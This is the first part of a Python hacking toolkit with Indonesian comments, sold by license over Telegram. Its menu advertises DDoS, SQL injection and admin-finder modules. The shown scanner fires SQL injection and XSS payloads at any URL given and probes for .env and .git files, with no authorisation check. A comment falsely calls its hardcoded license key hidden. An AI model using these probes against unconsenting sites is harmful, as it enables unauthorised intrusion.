#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
██╗      ██████╗  ██████╗ ██╗███╗   ██╗    ███████╗██╗   ██╗██████╗ ███████╗██████╗ 
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║    █████╗  ██║   ██║██████╔╝█████╗  ██████╔╝
██║     ██║   ██║██║   ██║██║██║╚██╗██║    ██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██████╔╝
██║     ██║   ██║██║   ██║██║██║╚██╗██║    ███████╗██║   ██║██████╔╝███████╗██║  ██║
╚═╝     ╚═╝   ╚═╝╚═╝   ╚═╝╚═╝╚═╝  ╚═══╝    ╚══════╝╚═╝   ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                                    
                    PENTEST SUITE PRO v5.0 | TELEGRAM: @Zxxtirwd
"""

import os
import sys
import time
import json
import requests
import threading
import subprocess
import socket
import hashlib
import random
import string
import re
import itertools
import queue
import ipaddress
import ssl
import urllib.parse
import urllib.request
import urllib.error
import base64
import binascii
import struct
import platform
import ctypes
import getpass
import shutil
import zipfile
import tarfile
import csv
import xml.etree.ElementTree as ET
import argparse
import configparser
import signal
import select
import pickle
import sqlite3
import uuid
import mimetypes
import ftplib
import smtplib
import poplib
import imaplib
import telnetlib
import http.client
import email
import email.mime.text
import email.mime.multipart
import email.header
import logging
from datetime import datetime, timedelta
from collections import OrderedDict, defaultdict, Counter
from pathlib import Path
from typing import List, Dict, Tuple, Optional, Any, Union, Callable
from io import BytesIO, StringIO
from html.parser import HTMLParser
from urllib.parse import urlparse, parse_qs, urlencode, urljoin
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from multiprocessing import Pool, Manager, Process
from colorama import Fore, Style, Back, init, AnsiToWin32
import warnings
warnings.filterwarnings('ignore')

# Optional imports dengan fallback
try:
    import dns.resolver
    DNS_AVAILABLE = True
except:
    DNS_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except:
    BEAUTIFULSOUP_AVAILABLE = False

# ==================== KONFIGURASI ====================
init(autoreset=True)

class Config:
    """Konfigurasi Pentest Suite"""
    
    # Sistem License - TIDAK DITAMPILKAN DI SOURCE
    MASTER_LICENSE_KEY = "mrzxx"  # HIDDEN - Hanya untuk developer
    LICENSE_PRICE = "Rp 100.000"
    TELEGRAM_CONTACT = "@Zxxtirwd"
    
    # Database user
    USER_DB_FILE = "users.db"
    LICENSE_DB_FILE = "licenses.db"
    
    # Path wordlists
    ADMIN_PATHS_FILE = "wordlists/admin_paths.txt"
    
    # Warna theme merah-hijau
    COLOR_PRIMARY = Fore.RED
    COLOR_SECONDARY = Fore.GREEN
    COLOR_INFO = Fore.YELLOW
    COLOR_WARNING = Fore.MAGENTA
    COLOR_SUCCESS = Fore.CYAN
    
    # ASCII Art untuk setiap halaman
    LOGIN_ASCII = """
██╗      ██████╗  ██████╗ ██╗███╗   ██╗
██║     ██╔═══██╗██╔════╝ ██║████╗  ██║
██║     ██║   ██║██║  ███╗██║██╔██╗ ██║
██║     ██║   ██║██║   ██║██║██║╚██╗██║
███████╗╚██████╔╝╚██████╔╝██║██║ ╚████║
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝╚═╝  ╚═══╝
"""
    
    WELCOME_ASCII = """
██╗    ██╗███████╗██╗     ██╗      ██████╗ ██████╗ ███╗   ███╗███████╗
██║    ██║██╔════╝██║     ██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝
██║ █╗ ██║█████╗  ██║     ██║     ██║     ██║   ██║██╔████╔██║█████╗  
██║███╗██║██╔══╝  ██║     ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  
╚███╔███╔╝███████╗███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗
 ╚══╝╚══╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝
"""
    
    MAIN_ASCII = """
██████╗ ███████╗███╗   ██╗████████╗███████╗███████╗████████╗██╗███╗   ██╗ ██████╗ 
██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██║████╗  ██║██╔════╝ 
██████╔╝█████╗  ██╔██╗ ██║   ██║   █████╗  ███████╗   ██║   ██║██╔██╗ ██║██║  ███╗
██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██╔══╝  ╚════██║   ██║   ██║██║╚██╗██║██║   ██║
██║     ███████╗██║ ╚████║   ██║   ███████╗███████║   ██║   ██║██║ ╚████║╚██████╔╝
╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
"""
    
    DDoS_ASCII = """
██████╗ ██████╗  ██████╗ ███████╗       █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗    
██╔══██╗██╔══██╗██╔═══██╗██╔════╝      ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝    
██║  ██║██║  ██║██║   ██║███████╗█████╗███████║   ██║      ██║   ███████║██║     █████╔╝     
██║  ██║██║  ██║██║   ██║╚════██║╚════╝██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗     
██████╔╝██████╔╝╚██████╔╝███████║      ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗    
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    
"""
    
    BUG_BOUNTY_ASCII = """
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       
"""
    
    ADMIN_FINDER_ASCII = """
 █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗    ███████╗██╗███╗   ██╗██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║    ██╔════╝██║████╗  ██║██╔══██╗██╔════╝██╔══██╗
███████║██║  ██║██╔████╔██║██║██╔██╗ ██║    █████╗  ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║    ██╔══╝  ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║    ██║     ██║██║ ╚████║██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝
"""
    
    SQL_INJECTION_ASCII = """
███████╗ ██████╗ ██╗     ██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗
██╔════╝██╔═══██╗██║     ██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝
███████╗██║   ██║██║     ██║██╔██╗ ██║     ██║█████╗  ██║        ██║   
╚════██║██║▄▄ ██║██║     ██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   
███████║╚██████╔╝███████╗██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   
"""
    
    IP_TRACKER_ASCII = """
██╗██████╗    ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
██║██╔══██╗   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
██║██████╔╝█████╗██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
██║██╔═══╝ ╚════╝██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
██║██║           ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
╚═╝╚═╝           ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""
    
    # Versi dan info
    VERSION = "5.0 PRO"
    CREATOR = "Mr zxx"
    TELEGRAM = "@Zxxtirwd"
    
    # Pengaturan jaringan
    DEFAULT_TIMEOUT = 10
    MAX_THREADS = 50
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
    ]

# ==================== UTILITAS ====================
class Utilitas:
    """Fungsi utilitas untuk suite pentest"""
    
    @staticmethod
    def clear_screen():
        """Bersihkan layar terminal"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def typewriter(text: str, delay: float = 0.03, color: str = Fore.WHITE):
        """Efek typewriter untuk teks"""
        for char in text:
            sys.stdout.write(color + char)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def print_centered(text: str, width: int = 80, color: str = Fore.WHITE):
        """Cetak teks terpusat"""
        centered = text.center(width)
        print(color + centered)
    
    @staticmethod
    def print_banner(text: str, width: int = 80, char: str = "═"):
        """Cetak banner dengan teks"""
        banner = f" {text} ".center(width, char)
        print(Config.COLOR_PRIMARY + banner)
    
    @staticmethod
    def loading_animation(text: str = "Memuat", duration: float = 2.0):
        """Tampilkan animasi loading"""
        chars = ["⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻", "⣽"]
        start_time = time.time()
        i = 0
        
        while time.time() - start_time < duration:
            sys.stdout.write(f"\r{Config.COLOR_INFO}{text} {chars[i % len(chars)]}")
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        
        sys.stdout.write("\r" + " " * (len(text) + 2) + "\r")
        sys.stdout.flush()
    
    @staticmethod
    def progress_bar(iteration: int, total: int, prefix: str = '', suffix: str = '', length: int = 50, fill: str = '█'):
        """Tampilkan progress bar"""
        percent = f"{100 * (iteration / float(total)):.1f}"
        filled_length = int(length * iteration // total)
        bar = fill * filled_length + '-' * (length - filled_length)
        
        sys.stdout.write(f'\r{prefix} |{bar}| {percent}% {suffix}')
        sys.stdout.flush()
        
        if iteration == total:
            print()
    
    @staticmethod
    def get_timestamp() -> str:
        """Dapatkan timestamp saat ini"""
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    @staticmethod
    def get_random_user_agent() -> str:
        """Dapatkan user agent acak"""
        return random.choice(Config.USER_AGENTS)
    
    @staticmethod
    def create_headers() -> Dict[str, str]:
        """Buat headers request"""
        return {
            'User-Agent': Utilitas.get_random_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
    
    @staticmethod
    def hash_password(password: str) -> str:
        """Hash password menggunakan SHA-256"""
        return hashlib.sha256(password.encode()).hexdigest()
    
    @staticmethod
    def is_valid_url(url: str) -> bool:
        """Cek apakah URL valid"""
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False
    
    @staticmethod
    def is_valid_ip(ip: str) -> bool:
        """Cek apakah alamat IP valid"""
        try:
            ipaddress.ip_address(ip)
            return True
        except:
            return False
    
    @staticmethod
    def get_local_ip() -> str:
        """Dapatkan alamat IP lokal"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def create_db():
        """Buat database jika belum ada"""
        try:
            conn = sqlite3.connect(Config.USER_DB_FILE)
            cursor = conn.cursor()
            
            # Tabel users
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    password TEXT NOT NULL,
                    license_key TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_login TIMESTAMP
                )
            ''')
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            print(f"Error creating database: {e}")

# ==================== SISTEM AUTHENTIKASI ====================
class AuthenticationSystem:
    """Sistem autentikasi dengan license key HIDDEN"""
    
    def __init__(self):
        self.current_user = None
        self.license_key = Config.MASTER_LICENSE_KEY  # HIDDEN - Tidak ditampilkan di source
        self.max_attempts = 3
        self.lock_time = 30
        self.failed_attempts = 0
    
    def validate_license(self, key: str) -> bool:
        """Validasi license key"""
        return key == self.license_key
    
    def validate_user(self, username: str, password: str) -> bool:
        """Validasi username dan password"""
        try:
            conn = sqlite3.connect(Config.USER_DB_FILE)
            cursor = conn.cursor()
            
            cursor.execute("SELECT password FROM users WHERE username = ?", (username,))
            result = cursor.fetchone()
            conn.close()
            
            if result:
                hashed_password = Utilitas.hash_password(password)
                return result[0] == hashed_password
            return False
        except:
            return False
    
    def show_welcome_animation(self):
        """Tampilkan animasi welcome"""
        Utilitas.clear_screen()
        
        # Animasi login ASCII
        print(Config.COLOR_PRIMARY + Config.LOGIN_ASCII)
        time.sleep(1)
        
        # Animasi welcome
        Utilitas.clear_screen()
        print(Config.COLOR_SECONDARY + Config.WELCOME_ASCII)
        
        for i in range(5):
            colors = [Config.COLOR_PRIMARY, Config.COLOR_SECONDARY, Config.COLOR_INFO, 
                     Config.COLOR_WARNING, Config.COLOR_SUCCESS]
            print(f"\r{colors[i]}Inisialisasi Sistem Pentest {'█' * (i+1)}", end="")
            time.sleep(0.3)
        
        print()
        time.sleep(1)
    
    def register_user(self, username: str, password: str, license_key: str):
        """Registrasi user baru"""
        try:
            if not self.validate_license(license_key):
                print(Config.COLOR_WARNING + "License key tidak valid!")
                return False
            
            conn = sqlite3.connect(Config.USER_DB_FILE)
            cursor = conn.cursor()
            
            # Cek apakah username sudah ada
            cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
            if cursor.fetchone():
                print(Config.COLOR_WARNING + "Username sudah terdaftar")
                conn.close()
                return False
            
            # Hash password
            hashed_password = Utilitas.hash_password(password)
            
            # Insert user baru
            cursor.execute('''
                INSERT INTO users (username, password, license_key)
                VALUES (?, ?, ?)
            ''', (username, hashed_password, license_key))
            
            conn.commit()
            conn.close()
            
            print(Config.COLOR_SUCCESS + "Registrasi berhasil!")
            print(Config.COLOR_INFO + f"Username: {username}")
            return True
            
        except Exception as e:
            print(Config.COLOR_WARNING + f"Error registrasi: {e}")
            return False
    
    def login(self):
        """Login user"""
        Utilitas.clear_screen()
        
        if self.failed_attempts >= self.max_attempts:
            print(Config.COLOR_WARNING + f"\nAkun terkunci. Tunggu {self.lock_time} detik.")
            time.sleep(self.lock_time)
            self.failed_attempts = 0
            return self.login()
        
        # Tampilkan login screen
        print(Config.COLOR_PRIMARY + Config.LOGIN_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        
        # Dapatkan credentials
        try:
            username = input(Config.COLOR_INFO + "Username: " + Config.COLOR_SECONDARY)
            password = getpass.getpass(Config.COLOR_INFO + "Password: " + Config.COLOR_SECONDARY)
            
            if not self.validate_user(username, password):
                print(Config.COLOR_WARNING + "\nUsername atau password salah!")
                self.failed_attempts += 1
                return False
            
            # Success
            self.current_user = username
            self.show_welcome_animation()
            
            # Update last login
            try:
                conn = sqlite3.connect(Config.USER_DB_FILE)
                cursor = conn.cursor()
                cursor.execute("UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE username = ?", (username,))
                conn.commit()
                conn.close()
            except:
                pass
            
            # Welcome message
            print(Config.COLOR_SECONDARY + Config.WELCOME_ASCII)
            print(Config.COLOR_INFO + "\n" + "=" * 60)
            print(Config.COLOR_SUCCESS + f"Selamat Datang, {self.current_user}!")
            print(Config.COLOR_INFO + f"Autentikasi Berhasil!")
            print(Config.COLOR_WARNING + f"Semua Modul Pentesting Diaktifkan")
            print(Config.COLOR_SUCCESS + f"Sesi Dimulai: {Utilitas.get_timestamp()}")
            
            # Countdown
            for i in range(3, 0, -1):
                print(Config.COLOR_INFO + f"\rMemuat menu utama dalam {i}...", end="")
                time.sleep(1)
            
            print()
            return True
            
        except KeyboardInterrupt:
            print(Config.COLOR_WARNING + "\nLogin dibatalkan")
            sys.exit(0)
    
    def register_menu(self):
        """Menu registrasi"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + "=" * 60)
        print(Config.COLOR_SECONDARY + "        REGISTRASI AKUN BARU")
        print(Config.COLOR_PRIMARY + "=" * 60)
        
        print(Config.COLOR_INFO + "\nInformasi Pembelian License:")
        print(Config.COLOR_WARNING + f"Harga: {Config.LICENSE_PRICE}")
        print(Config.COLOR_WARNING + f"Telegram: {Config.TELEGRAM}")
        print(Config.COLOR_WARNING + "Anda harus membeli license key terlebih dahulu")
        
        print(Config.COLOR_PRIMARY + "\n" + "=" * 60)
        
        try:
            username = input(Config.COLOR_INFO + "\nUsername: " + Config.COLOR_SECONDARY)
            password = getpass.getpass(Config.COLOR_INFO + "Password: " + Config.COLOR_SECONDARY)
            confirm_password = getpass.getpass(Config.COLOR_INFO + "Konfirmasi Password: " + Config.COLOR_SECONDARY)
            license_key = input(Config.COLOR_INFO + "License Key: " + Config.COLOR_SECONDARY)
            
            if password != confirm_password:
                print(Config.COLOR_WARNING + "Password tidak cocok!")
                input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
                return
            
            if len(password) < 6:
                print(Config.COLOR_WARNING + "Password minimal 6 karakter!")
                input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
                return
            
            # Registrasi
            if self.register_user(username, password, license_key):
                input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            else:
                input(Config.COLOR_INFO + "\nTekan Enter untuk mencoba lagi...")
                
        except KeyboardInterrupt:
            print(Config.COLOR_WARNING + "\nRegistrasi dibatalkan")
            time.sleep(1)
    
    def purchase_info(self):
        """Informasi pembelian"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + "=" * 60)
        print(Config.COLOR_SECONDARY + "        PEMBELIAN LICENSE KEY")
        print(Config.COLOR_PRIMARY + "=" * 60)
        
        print(Config.COLOR_INFO + "\nInformasi Pembelian:")
        print(Config.COLOR_INFO + f"Harga: {Config.LICENSE_PRICE}")
        print(Config.COLOR_INFO + f"Telegram: {Config.TELEGRAM}")
        print(Config.COLOR_INFO + f"Creator: {Config.CREATOR}")
        
        print(Config.COLOR_SECONDARY + "\nCara Pembelian:")
        print(Config.COLOR_INFO + "1. Hubungi Telegram @Zxxtirwd")
        print(Config.COLOR_INFO + "2. Transfer sesuai harga")
        print(Config.COLOR_INFO + "3. Kirim bukti transfer")
        print(Config.COLOR_INFO + "4. Terima License Key")
        print(Config.COLOR_INFO + "5. Registrasi akun")
        
        print(Config.COLOR_PRIMARY + "\n" + "=" * 60)
        input(Config.COLOR_INFO + "\nTekan Enter untuk kembali...")
    
    def show_main_menu(self):
        """Tampilkan menu utama"""
        Utilitas.clear_screen()
        
        # ASCII utama
        print(Config.COLOR_PRIMARY + Config.MAIN_ASCII)
        
        # Info user dan waktu
        now = datetime.now()
        print(Config.COLOR_INFO + "=" * 60)
        print(Config.COLOR_SUCCESS + f"Pengguna: {self.current_user}")
        print(Config.COLOR_INFO + f"Tanggal: {now.strftime('%B %d, %Y')}")
        print(Config.COLOR_WARNING + f"Waktu: {now.strftime('%H:%M:%S')}")
        print(Config.COLOR_SUCCESS + f"Pembuat: {Config.CREATOR}")
        print(Config.COLOR_INFO + "=" * 60)
        
        # Opsi menu
        print(Config.COLOR_SECONDARY + "\nMENU PENTESTING:")
        print(Config.COLOR_INFO + "[1] Bug Bounty Scanner")
        print(Config.COLOR_INFO + "[2] Admin Panel Finder")
        print(Config.COLOR_INFO + "[3] DDoS Tester")
        print(Config.COLOR_INFO + "[4] SQL Injection Tester")
        print(Config.COLOR_INFO + "[5] IP Tracker")
        print(Config.COLOR_INFO + "[6] Registrasi Akun Baru")
        print(Config.COLOR_INFO + "[7] Informasi Pembelian")
        print(Config.COLOR_INFO + "[0] Keluar")
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
    
    def logout(self):
        """Logout user"""
        print(Config.COLOR_INFO + "\nKeluar dari sistem...")
        Utilitas.loading_animation("Menghapus data sesi", 2)
        self.current_user = None
        print(Config.COLOR_SUCCESS + "Logout berhasil!")
        time.sleep(1)

# ==================== MODUL BUG BOUNTY ====================
class BugBountyModule:
    """Modul Bug Bounty Scanner"""
    
    def __init__(self):
        self.target = ""
        self.session = requests.Session()
        self.session.headers.update(Utilitas.create_headers())
        self.timeout = Config.DEFAULT_TIMEOUT
    
    def show_menu(self):
        """Tampilkan menu bug bounty"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.BUG_BOUNTY_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        BUG BOUNTY SCANNER")
        print(Config.COLOR_INFO + "=" * 60)
        
        print(Config.COLOR_INFO + "\nFitur:")
        print(Config.COLOR_SUCCESS + "1. Security Headers Check")
        print(Config.COLOR_SUCCESS + "2. CORS Misconfiguration")
        print(Config.COLOR_SUCCESS + "3. Exposed Files Detection")
        print(Config.COLOR_SUCCESS + "4. SQL Injection Detection")
        print(Config.COLOR_SUCCESS + "5. XSS Vulnerability Scan")
        print(Config.COLOR_SUCCESS + "6. Directory Listing Check")
        print(Config.COLOR_SUCCESS + "7. HTTP Methods Testing")
        print(Config.COLOR_WARNING + "0. Kembali ke Menu Utama")
        
        print(Config.COLOR_INFO + "\n" + "=" * 60)
    
    def run_scan(self):
        """Jalankan scan bug bounty"""
        self.show_menu()
        
        target = input(Config.COLOR_INFO + "\nMasukkan URL target (contoh: https://example.com): " + Config.COLOR_SECONDARY)
        
        if not Utilitas.is_valid_url(target):
            print(Config.COLOR_WARNING + "URL tidak valid. Harap sertakan http:// atau https://")
            input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
            return
        
        self.target = target.rstrip('/')
        
        print(Config.COLOR_INFO + f"\nMemulai scan pada: {self.target}")
        Utilitas.loading_animation("Menginisialisasi scanner", 1)
        
        # Jalankan semua checks
        results = self.perform_all_checks()
        
        # Tampilkan hasil
        self.display_results(results)
        
        input(Config.COLOR_INFO + "\nTekan Enter untuk melanjutkan...")
    
    def perform_all_checks(self):
        """Lakukan semua pemeriksaan"""
        results = {}
        
        checks = [
            ("Security Headers", self.check_security_headers),
            ("CORS Misconfiguration", self.check_cors),
            ("Exposed Files", self.check_exposed_files),
            ("SQL Injection", self.check_sql_injection),
            ("XSS Vulnerabilities", self.check_xss),
            ("Directory Listing", self.check_directory_listing),
            ("HTTP Methods", self.check_http_methods)
        ]
        
        for i, (check_name, check_func) in enumerate(checks):
            Utilitas.progress_bar(i + 1, len(checks), prefix='Scanning:', suffix=check_name)
            results[check_name] = check_func()
            time.sleep(0.1)
        
        return results
    
    def check_security_headers(self):
        """Cek security headers"""
        try:
            response = self.session.get(self.target, timeout=self.timeout)
            headers = response.headers
            
            missing = []
            security_headers = [
                'X-Frame-Options',
                'X-XSS-Protection',
                'X-Content-Type-Options',
                'Strict-Transport-Security',
                'Content-Security-Policy'
            ]
            
            for header in security_headers:
                if header not in headers:
                    missing.append(header)
            
            return missing if missing else ["Semua security headers ada"]
            
        except Exception as e:
            return [f"Error: {str(e)}"]
    
    def check_cors(self):
        """Cek konfigurasi CORS"""
        issues = []
        
        try:
            origins = ['https://evil.com', 'null']
            
            for origin in origins:
                headers = {'Origin': origin}
                response = self.session.get(self.target, headers=headers, timeout=self.timeout)
                
                if 'Access-Control-Allow-Origin' in response.headers:
                    if response.headers['Access-Control-Allow-Origin'] == '*':
                        issues.append("CORS: Wildcard origin diizinkan")
                    elif response.headers['Access-Control-Allow-Origin'] == origin:
                        issues.append(f"CORS: Origin {origin} diizinkan")
        
        except Exception as e:
            issues.append(f"Error: {str(e)}")
        
        return issues if issues else ["Konfigurasi CORS aman"]
    
    def check_exposed_files(self):
        """Cek file yang terekspos"""
        sensitive_files = [
            '/.git/HEAD',
            '/.env',
            '/robots.txt',
            '/sitemap.xml',
            '/phpinfo.php',
            '/test.php'
        ]
        
        found_files = []
        
        for file_path in sensitive_files:
            url = self.target + file_path
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    found_files.append(file_path)
            except:
                pass
        
        return found_files if found_files else ["Tidak ada file sensitif yang terekspos"]
    
    def check_sql_injection(self):
        """Cek SQL injection"""
        issues = []
        payloads = ["'", "' OR '1'='1", "' OR '1'='1' --"]
        
        # Cek parameter URL
        parsed = urlparse(self.target)
        query_params = parse_qs(parsed.query)
        
        for param_name in query_params:
            for payload in payloads:
                test_params = query_params.copy()
                test_params[param_name] = payload
                
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    response = self.session.get(test_url, timeout=5)
                    content = response.text.lower()
                    
                    if any(error in content for error in ['sql', 'mysql', 'postgresql', 'syntax']):
                        issues.append(f"SQLi: Parameter '{param_name}'")
                        break
                except:
                    pass
        
        return issues if issues else ["Tidak ditemukan SQL injection"]
    
    def check_xss(self):
        """Cek XSS"""
        issues = []
        payloads = ["<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>"]
        
        parsed = urlparse(self.target)
        query_params = parse_qs(parsed.query)
        
        for param_name in query_params:
            for payload in payloads:
                test_params = query_params.copy()
                test_params[param_name] = payload
                
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    response = self.session.get(test_url, timeout=5)
                    if payload in response.text:
                        issues.append(f"XSS: Parameter '{param_name}'")
                        break
                except:
                    pass
        
        return issues if issues else ["Tidak ditemukan XSS"]
    
    def check_directory_listing(self):
        """Cek directory listing"""
        directories = ['/admin/', '/images/', '/uploads/', '/backup/', '/tmp/']
        issues = []
        
        for directory in directories:
            url = self.target + directory
            try:
                response = self.session.get(url, timeout=5)
                content = response.text.lower()
                
                if any(indicator in content for indicator in ['index of', 'directory listing', 'parent directory']):
                    issues.append(f"Directory listing: {url}")
            except:
                pass
        
        return issues if issues else ["Tidak ada directory listing"]
    
    def check_http_methods(self):
        """Cek metode HTTP berbahaya"""
        dangerous_methods = []
        methods = ['PUT', 'DELETE', 'TRACE', 'CONNECT']
        
        try:
            response = self.session.request('OPTIONS', self.target, timeout=self.timeout)
            
            if 'Allow' in response.headers:
                allowed = response.headers['Allow'].upper().split(', ')
                
                for method in methods:
                    if method in allowed:
                        dangerous_methods.append(method)
        
        except Exception as e:
            dangerous_methods.append(f"Error: {str(e)}")
        
        return dangerous_methods if dangerous_methods else ["Metode HTTP aman"]
    
    def display_results(self, results):
        """Tampilkan hasil scan"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.BUG_BOUNTY_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        HASIL SCAN BUG BOUNTY")
        print(Config.COLOR_INFO + "=" * 60)
        print(Config.COLOR_SUCCESS + f"Target: {self.target}")
        print(Config.COLOR_INFO + f"Waktu: {Utilitas.get_timestamp()}")
        print(Config.COLOR_INFO + "=" * 60)
        
        total_vulnerabilities = 0
        
        for check_name, vulnerabilities in results.items():
            if vulnerabilities and not (isinstance(vulnerabilities, list) and len(vulnerabilities) == 1 and 'Error:' in vulnerabilities[0]):
                print(Config.COLOR_INFO + f"\n{check_name}:")
                for vuln in vulnerabilities:
                    if not ('Error:' in str(vuln)):
                        print(Config.COLOR_WARNING + f"  [!] {vuln}")
                        total_vulnerabilities += 1
            else:
                print(Config.COLOR_INFO + f"\n{check_name}:")
                print(Config.COLOR_SUCCESS + f"  [+] {vulnerabilities[0]}")
        
        if total_vulnerabilities > 0:
            print(Config.COLOR_WARNING + f"\nTotal kerentanan ditemukan: {total_vulnerabilities}")
        else:
            print(Config.COLOR_SUCCESS + "\nTidak ada kerentanan kritis ditemukan!")

# ==================== MODUL ADMIN FINDER ====================
class AdminFinderModule:
    """Modul Admin Panel Finder"""
    
    def __init__(self):
        self.base_url = ""
        self.admin_paths = self.load_admin_paths()
        self.found_paths = []
    
    def show_menu(self):
        """Tampilkan menu admin finder"""
        Utilitas.clear_screen()
        print(Config.COLOR_PRIMARY + Config.ADMIN_FINDER_ASCII)
        print(Config.COLOR_INFO + "\n" + "=" * 60)
        print(Config.COLOR_SECONDARY + "        ADMIN PANEL FINDER")
        print(Config.COLOR_INFO + "=" * 60)
        
        print(Config.COLOR_INFO + "\nFitur:")
        print(Config.COLOR_SUCCESS + "• 100+ admin paths")
        print(Config.COLOR_SUCCESS + "• Multi-threading")
